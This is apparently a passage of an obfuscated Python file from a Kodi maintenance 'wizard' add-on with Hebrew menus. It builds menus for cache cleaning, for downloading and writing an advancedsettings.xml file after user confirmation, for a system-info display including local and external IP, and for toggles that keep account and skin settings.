	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0O00OO00OOOO0O0 .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2898
	if OO0O00OO00OOOO0O0 =='true':#line:2899
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00O0O0O0O0O0OOOO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0O0O0O0000OOOO0 .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOOO0O0O00O0O0OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO0000O00O00OOOOO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2904
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O000000OO000OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	if OO0O000000OO000OO =='true':#line:2906
		addFile ('--- Include All Video Addons: %s'%OO00O00OOOOOOO0OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Bob: %s'%OOOOOOOOO00O00O0O .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Phoenix: %s'%O0OOOOOO0O0OO0OOO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Specto: %s'%OOO000O0O00O000OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Exodus: %s'%OOO0O00OO0O0OOOO0 .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Salts: %s'%OOO00000OOOOOO0OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Salts HD Lite: %s'%OO0OOO00OO000000O .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include One Channel: %s'%O0O0OOO00000O0O0O .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Genesis: %s'%OO0O0O00O0OO000OO .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2917
	setView ('files','viewType')#line:2918
def advancedWindow (url =None ):#line:2920
	if not ADVANCEDFILE =='http://':#line:2921
		if url ==None :#line:2922
			O0O0O0OO0OO000000 =wiz .workingURL (ADVANCEDFILE )#line:2923
			O00000O00O0000O0O =uservar .ADVANCEDFILE #line:2924
		else :#line:2925
			O0O0O0OO0OO000000 =wiz .workingURL (url )#line:2926
			O00000O00O0000O0O =url #line:2927
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2928
		if os .path .exists (ADVANCED ):#line:2929
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2930
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if O0O0O0OO0OO000000 ==True :#line:2932
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			OO0OOOO0O0OOO0OOO =wiz .openURL (O00000O00O0000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2934
			O0OO0OO0OO000O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OOOO0O0OOO0OOO )#line:2935
			if len (O0OO0OO0OO000O0O0 )>0 :#line:2936
				for OO0OO0O0000000OOO ,O0O00O0O0OOO0OOO0 ,url ,O00OOOOOO0OO00O00 ,OOOO0OOOOOO000OO0 ,OO0O000OO0O0O0O00 in O0OO0OO0OO000O0O0 :#line:2937
					if O0O00O0O0OOO0OOO0 .lower ()=="yes":#line:2938
						addDir ("[B]%s[/B]"%OO0OO0O0000000OOO ,'advancedsetting',url ,description =OO0O000OO0O0O0O00 ,icon =O00OOOOOO0OO00O00 ,fanart =OOOO0OOOOOO000OO0 ,themeit =THEME3 )#line:2939
					else :#line:2940
						addFile (OO0OO0O0000000OOO ,'writeadvanced',OO0OO0O0000000OOO ,url ,description =OO0O000OO0O0O0O00 ,icon =O00OOOOOO0OO00O00 ,fanart =OOOO0OOOOOO000OO0 ,themeit =THEME2 )#line:2941
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2942
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0O0OO0OO000000 )#line:2943
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2944
def writeAdvanced (O00O0OO0O0OOO00OO ,O0O0OOOO00000000O ):#line:2946
	O0OOOOOOO0OO0OOO0 =wiz .workingURL (O0O0OOOO00000000O )#line:2947
	if O0OOOOOOO0OO0OOO0 ==True :#line:2948
		if os .path .exists (ADVANCED ):OO00000OOO00O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OO0O0OOO00OO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2949
		else :OO00000OOO00O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OO0O0OOO00OO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2950
		if OO00000OOO00O0O0O ==1 :#line:2952
			OOOO0OOO00OOOO0O0 =wiz .openURL (O0O0OOOO00000000O )#line:2953
			OO0O00OO000O0000O =open (ADVANCED ,'w');#line:2954
			OO0O00OO000O0000O .write (OOOO0OOO00OOOO0O0 )#line:2955
			OO0O00OO000O0000O .close ()#line:2956
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2957
			wiz .killxbmc (True )#line:2958
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2959
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOOOOOO0OO0OOO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2960
def viewAdvanced ():#line:2962
	O0O0000O00OO00OO0 =open (ADVANCED )#line:2963
	O0OOOOOOO000O0OO0 =O0O0000O00OO00OO0 .read ().replace ('\t','    ')#line:2964
	wiz .TextBox (ADDONTITLE ,O0OOOOOOO000O0OO0 )#line:2965
	O0O0000O00OO00OO0 .close ()#line:2966
def removeAdvanced ():#line:2968
	if os .path .exists (ADVANCED ):#line:2969
		wiz .removeFile (ADVANCED )#line:2970
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2971
def showAutoAdvanced ():#line:2973
	notify .autoConfig ()#line:2974
def getIP ():#line:2976
	OOO00OO0OOOO0O00O ='http://whatismyipaddress.com/'#line:2977
	if not wiz .workingURL (OOO00OO0OOOO0O00O ):return 'Unknown','Unknown','Unknown'#line:2978
	OO00O00000000O0O0 =wiz .openURL (OOO00OO0OOOO0O00O ).replace ('\n','').replace ('\r','')#line:2979
	if not 'Access Denied'in OO00O00000000O0O0 :#line:2980
		OO0OO00OO0000OOOO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO00O00000000O0O0 )#line:2981
		O0O0OOOOOOO0O0O00 =OO0OO00OO0000OOOO [0 ]if (len (OO0OO00OO0000OOOO )>0 )else 'Unknown'#line:2982
		O00OO000OO000O000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO00O00000000O0O0 )#line:2983
		O00O0OOOO0OOO0O0O =O00OO000OO000O000 [0 ]if (len (O00OO000OO000O000 )>0 )else 'Unknown'#line:2984
		O0O0000OO0O00O00O =O00OO000OO000O000 [1 ]+', '+O00OO000OO000O000 [2 ]+', '+O00OO000OO000O000 [3 ]if (len (O00OO000OO000O000 )>2 )else 'Unknown'#line:2985
		return O0O0OOOOOOO0O0O00 ,O00O0OOOO0OOO0O0O ,O0O0000OO0O00O00O #line:2986
	else :return 'Unknown','Unknown','Unknown'#line:2987
def systemInfo ():#line:2989
	OOOOOOO00OOO0OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3003
	O0000O0OO00000000 =[];OO00OOO0O0O000O00 =0 #line:3004
	for OO0O0OO0O0OO0O0O0 in OOOOOOO00OOO0OO00 :#line:3005
		O0O00OOOOOOOO0000 =wiz .getInfo (OO0O0OO0O0OO0O0O0 )#line:3006
		O0O00O0OO00OO0OO0 =0 #line:3007
		while O0O00OOOOOOOO0000 =="Busy"and O0O00O0OO00OO0OO0 <10 :#line:3008
			O0O00OOOOOOOO0000 =wiz .getInfo (OO0O0OO0O0OO0O0O0 );O0O00O0OO00OO0OO0 +=1 ;wiz .log ("%s sleep %s"%(OO0O0OO0O0OO0O0O0 ,str (O0O00O0OO00OO0OO0 )));xbmc .sleep (1000 )#line:3009
		O0000O0OO00000000 .append (O0O00OOOOOOOO0000 )#line:3010
		OO00OOO0O0O000O00 +=1 #line:3011
	OOO00OOOO0O0O0O00 =O0000O0OO00000000 [8 ]if 'Una'in O0000O0OO00000000 [8 ]else wiz .convertSize (int (float (O0000O0OO00000000 [8 ][:-8 ]))*1024 *1024 )#line:3012
	O000O0OO00OOO0OO0 =O0000O0OO00000000 [9 ]if 'Una'in O0000O0OO00000000 [9 ]else wiz .convertSize (int (float (O0000O0OO00000000 [9 ][:-8 ]))*1024 *1024 )#line:3013
	O0000000OO0O0O0OO =O0000O0OO00000000 [10 ]if 'Una'in O0000O0OO00000000 [10 ]else wiz .convertSize (int (float (O0000O0OO00000000 [10 ][:-8 ]))*1024 *1024 )#line:3014
	O00OOO00OO000OO00 =wiz .convertSize (int (float (O0000O0OO00000000 [11 ][:-2 ]))*1024 *1024 )#line:3015
	O00OOOOO00OOOOOOO =wiz .convertSize (int (float (O0000O0OO00000000 [12 ][:-2 ]))*1024 *1024 )#line:3016
	OO0O0OOO0O00OOOO0 =wiz .convertSize (int (float (O0000O0OO00000000 [13 ][:-2 ]))*1024 *1024 )#line:3017
	OO00OO00O0000O00O ,O0OOO0O00OO00000O ,OO00OOO000O0O000O =getIP ()#line:3018
	OOO00OO0O0OO0O0O0 =[];OO0OO0OOOOOOO0OOO =[];O0O00000O0000000O =[];O000O0O00OOOO00O0 =[];OO00O0OOO0OOOOO0O =[];OO0000OO0000O0O0O =[];OOO0O00O000OOOOOO =[]#line:3020
	OOOO00O0O000O0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3022
	for OO0OOOO0OOO0O0O00 in sorted (OOOO00O0O000O0O0O ,key =lambda OO0O0OOO00O0OOOO0 :OO0O0OOO00O0OOOO0 ):#line:3023
		OO000OO0OOO0O0O0O =os .path .split (OO0OOOO0OOO0O0O00 [:-1 ])[1 ]#line:3024
		if OO000OO0OOO0O0O0O =='packages':continue #line:3025
		OO0OOOO00OOOO0000 =os .path .join (OO0OOOO0OOO0O0O00 ,'addon.xml')#line:3026
		if os .path .exists (OO0OOOO00OOOO0000 ):#line:3027
			O0O000OOO00000OO0 =open (OO0OOOO00OOOO0000 )#line:3028
			O000O000OOO0OO0O0 =O0O000OOO00000OO0 .read ()#line:3029
			O0O0OOO0OO000O000 =re .compile ("<provides>(.+?)</provides>").findall (O000O000OOO0OO0O0 )#line:3030
			if len (O0O0OOO0OO000O000 )==0 :#line:3031
				if OO000OO0OOO0O0O0O .startswith ('skin'):OOO0O00O000OOOOOO .append (OO000OO0OOO0O0O0O )#line:3032
				if OO000OO0OOO0O0O0O .startswith ('repo'):OO00O0OOO0OOOOO0O .append (OO000OO0OOO0O0O0O )#line:3033
				else :OO0000OO0000O0O0O .append (OO000OO0OOO0O0O0O )#line:3034
			elif not (O0O0OOO0OO000O000 [0 ]).find ('executable')==-1 :O000O0O00OOOO00O0 .append (OO000OO0OOO0O0O0O )#line:3035
			elif not (O0O0OOO0OO000O000 [0 ]).find ('video')==-1 :O0O00000O0000000O .append (OO000OO0OOO0O0O0O )#line:3036
			elif not (O0O0OOO0OO000O000 [0 ]).find ('audio')==-1 :OO0OO0OOOOOOO0OOO .append (OO000OO0OOO0O0O0O )#line:3037
			elif not (O0O0OOO0OO000O000 [0 ]).find ('image')==-1 :OOO00OO0O0OO0O0O0 .append (OO000OO0OOO0O0O0O )#line:3038
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOOO0O0O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0OO00OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000000OO0O0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO00OO000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO00OOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOO0O00OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO00O0000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00OO00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOO000O0O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO00000000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	OO0O000000O00O0O0 =len (OOO00OO0O0OO0O0O0 )+len (OO0OO0OOOOOOO0OOO )+len (O0O00000O0000000O )+len (O000O0O00OOOO00O0 )+len (OO0000OO0000O0O0O )+len (OOO0O00O000OOOOOO )+len (OO00O0OOO0OOOOO0O )#line:3068
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0O000000O00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00000O0000000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O00OOOO00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0OOOOOOO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OO0O0OO0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0OOO0OOOOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O00O000OOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000OO0000O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
def Menu ():#line:3077
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3078
def saveMenu ():#line:3080
	O0000OOOO0OO00O0O ='[COLOR yellow]מופעל[/COLOR]';O0OO00OOOO00000O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3082
	OOO00O000OO00OOO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3083
	O0O0OOOOOO0OOO000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3084
	OO0OOOO0O0O00OO00 ='true'if KEEPINFO =='true'else 'false'#line:3085
	O0OOO000O00OO0OOO ='true'if KEEPSOUND =='true'else 'false'#line:3087
	O0000O0OOOOO00O0O ='true'if KEEPVIEW =='true'else 'false'#line:3088
	OO00OO0O0OO0O0OOO ='true'if KEEPSKIN =='true'else 'false'#line:3089
	OOOOO00O00O000O0O ='true'if KEEPSKIN2 =='true'else 'false'#line:3090
	OO00OOOO00O0OOO00 ='true'if KEEPSKIN3 =='true'else 'false'#line:3091
	OO0OO0O0O000000O0 ='true'if KEEPADDONS =='true'else 'false'#line:3092
	OOOOOO0O0O0O0O000 ='true'if KEEPPVR =='true'else 'false'#line:3093
	O0000OO0O0O0O00O0 ='true'if KEEPTVLIST =='true'else 'false'#line:3094
	OOO000O00O00O0O0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3095
	OO0OO00O0OO0O0OO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3096
	O0OO00O00O0000OOO ='true'if KEEPHUBTV =='true'else 'false'#line:3097
	O0OOOO0000O0OOOOO ='true'if KEEPHUBVOD =='true'else 'false'#line:3098
	OOO000000OO000O0O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3099
	OOO00000O0O0OOO0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3100
	OOOO00OOO00O0OOO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3101
	O00O00O000000OOO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3102
	O00OOOO0O00O00O00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3103
	O000OOO00OOOO00O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3104
	O0000OO0OOOO0OOOO ='true'if KEEPREAL =='true'else 'false'#line:3105
	OO0OOOO0OO00O0OO0 ='true'if KEEPRD2 =='true'else 'false'#line:3106
	OO00OOOOO0O0O0OO0 ='true'if KEEPTORNET =='true'else 'true'#line:3107
	O00O0OOO0O00O000O ='true'if KEEPLOGIN =='true'else 'false'#line:3108
	O0OOO0O000OOOO0OO ='true'if KEEPSOURCES =='true'else 'false'#line:3109
	O0OOO0O0O000O000O ='true'if KEEPADVANCED =='true'else 'false'#line:3110
	O000OOOO00000O00O ='true'if KEEPPROFILES =='true'else 'false'#line:3111
	OOOOOO00000OO0O0O ='true'if KEEPFAVS =='true'else 'false'#line:3112
	OO0OOOOOO00OOOOOO ='true'if KEEPREPOS =='true'else 'false'#line:3113
	OO0000O0O00OOO00O ='true'if KEEPSUPER =='true'else 'false'#line:3114
	OO00O0OO000OO0O00 ='true'if KEEPWHITELIST =='true'else 'false'#line:3115
	OO0OOO0OO0OOOOOO0 ='true'if KEEPWEATHER =='true'else 'false'#line:3116
	O00OOOOOOOOOO0OOO ='true'if KEEPVICTORY =='true'else 'false'#line:3117
	O0O00O000000O0O0O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3118
	if OO00O0OO000OO0O00 =='true':#line:3120
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3123
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת חשבון RD:  '%O0000OO0OOOO0OOOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון טראקט:  '%O000OOO00OOOO00O0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת מועדפים:  '%OOOOOO00000OO0O0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOOOO0O0O0O0O000 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O00OOOOOOOOOO0OOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O00O000000O0O0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0000OO0O0O0O00O0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח סרטים:  '%OOO000O00O00O0O0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח סדרות:  '%OO0OO00O0OO0O0OO0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח טלויזיה:  '%O0OO00O00O0000OOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OOOO0000O0OOOOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח ספורט:  '%OOO000000OO000O0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח ילדים:  '%OOO00000O0O0OOO0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח מוסיקה:  '%OOOO00OOO00O0OOO0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00O00O000000OOO0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת כל האריחים בסקין:  '%OO00OO0O0OO0O0OOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
